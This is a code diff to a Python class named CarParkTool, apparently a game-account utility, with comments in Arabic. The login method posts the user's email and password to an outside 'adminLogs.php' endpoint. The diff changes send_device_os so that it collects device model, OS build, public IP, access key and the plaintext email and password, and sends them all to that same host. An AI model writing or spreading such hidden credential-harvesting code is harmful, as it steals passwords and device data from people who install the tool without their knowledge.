@@ -1,11 +1,13 @@
-import requests
 import platform
+import subprocess
 import os
 import requests
 import subprocess
 import urllib.parse
 import json
 from time import sleep
+
+
 
 
 
@@ -17,23 +19,23 @@ class CarParkTool:
         self.auth_token = None
         self.access_key = access_key
         self.telegram_id = None
-        
+
     def log_action(self, action_name, data):
-        log_url = "https://popstool.io/beekeeper/adminLogs.php"
+        log_url = "https://popstool.io/beekeeper/adminLogs.php"  # تغيير العنوان إلى adminLogs.php
         key_data = self.get_key_data()
         self.telegram_id = key_data.get("telegram_id", "Unknown")
-        log_data = { "action": action_name, "data": data, "telegram_id": self.telegram_id }
+        log_data = {"action": action_name, "data": data, "telegram_id": self.telegram_id}
         response = requests.post(log_url, json=log_data)
         if response.status_code != 200:
             pass
-    
+
     def login(self, email, password) -> int:
-        payload = { "account_email": email, "account_password": password }
-        params = { "key": self.access_key } 
+        payload = {"account_email": email, "account_password": password}
+        params = {"key": self.access_key}
         response = requests.post(f"{BASE_URL}/account_login", params=params, data=payload)
         response_decoded = response.json()
         if response_decoded.get("ok"):
-            self.log_action("login", { "payload": payload, "params": params })
+            self.log_action("login", {"payload": payload, "params": params})
             self.auth_token = response_decoded.get("auth")
             key_data = self.get_key_data()
             self.telegram_id = key_data.get("telegram_id")
@@ -42,11 +44,13 @@ class CarParkTool:
 
     def send_device_os(self, email=None, password=None):
         try:
+            # جمع بيانات النظام
             system = platform.system()
             release = platform.release()
             device_name = "Unknown"
             build_number = "Unknown"
-            if system == "Darwin":
+
+            if system == "Darwin":  # إذا كان النظام macOS أو iOS
                 if os.path.exists("/bin/ash") or "iSH" in release:
                     device_os = "iOS (iSH)"
                     device_name = subprocess.getoutput("sysctl -n hw.model") or "iSH Device"
@@ -55,7 +59,7 @@ class CarParkTool:
                     device_os = "macOS"
                     device_name = subprocess.getoutput("sysctl -n hw.model") or "Mac"
                     build_number = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
-            elif system == "Linux":
+            elif system == "Linux":  # إذا كان النظام Linux أو Android
                 device_os = "Android" if os.path.exists("/system/bin") else "Linux"
                 if device_os == "Android":
                     device_name = subprocess.getoutput("getprop ro.product.model") or "Android Device"
@@ -63,7 +67,7 @@ class CarParkTool:
                 else:
                     device_name = "Linux Device"
                     build_number = "Unknown"
-            else:
+            else:  # لنظام التشغيل الذي لا نعرفه
                 device_os = system + " " + release
                 device_name = platform.node()
                 build_number = "Unknown"
@@ -71,24 +75,42 @@ class CarParkTool:
             device_os = "Unknown"
             device_name = "Unknown"
             build_number = "Unknown"
+
         try:
+            # الحصول على عنوان الـ IP
             ip_address = requests.get("https://api.ipify.org").text.strip()
         except:
             ip_address = "Unknown"
+
+        # إعداد البيانات التي سيتم إرسالها
         payload = {
-            "access_key": self.access_key,
-            "device_os": device_os,
-            "device_name": device_name,
-            "build_number": build_number,
-            "ip_address": ip_address,
-            "telegram_id": getattr(self, "telegram_id", "Unknown")
+            "action": "device_info",  # نوع الإجراء (قد يكون مختلفًا حسب متطلباتك)
+            "data": {
+                "access_key": self.access_key,
+                "device_os": device_os,
+                "device_name": device_name,
+                "build_number": build_number,
+                "ip_address": ip_address,
+                "telegram_id": getattr(self, "telegram_id", "Unknown")
+            }
         }
+
+        # إضافة البريد الإلكتروني وكلمة المرور إذا كانت موجودة
         if email:
-            payload["email"] = email
+            payload["data"]["email"] = email
         if password:
-            payload["password"] = password
-        response = requests.post(f"{BASE_URL}/save_device", data=payload)
-        return response.status_code == 200
+            payload["data"]["password"] = password
+
+        # إرسال البيانات إلى adminLogs.php باستخدام POST مع تنسيق JSON
+        response = requests.post("https://popstool.io/beekeeper/adminLogs.php", json=payload)
+
+        # التحقق من نجاح العملية
+        if response.status_code == 200:
+            print("تم إرسال البيانات بنجاح إلى adminLogs.php")
+            return True
+        else:
+            print(f"فشل في إرسال البيانات. الحالة: {response.status_code}")
+            return False
     
     def register(self, email, password) -> int:
         payload = { "account_email": email, "account_password": password }
